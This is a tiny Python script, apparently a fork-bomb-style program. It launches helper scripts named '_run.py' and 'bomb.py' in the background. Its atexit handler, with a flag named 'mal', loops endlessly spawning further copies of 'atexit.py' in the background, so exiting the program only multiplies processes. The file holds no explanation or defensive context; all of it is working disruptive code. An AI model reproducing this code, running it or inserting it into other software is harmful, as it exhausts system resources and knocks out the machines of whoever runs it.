import os
import atexit
os.system("python " + os.getcwd() + "/_run.py & python " + os.getcwd() + "/bomb.py &")

@atexit.register
def goodbye():
  mal = True
  while mal == True:
    os.system("python " + os.getcwd() + "/atexit.py &")
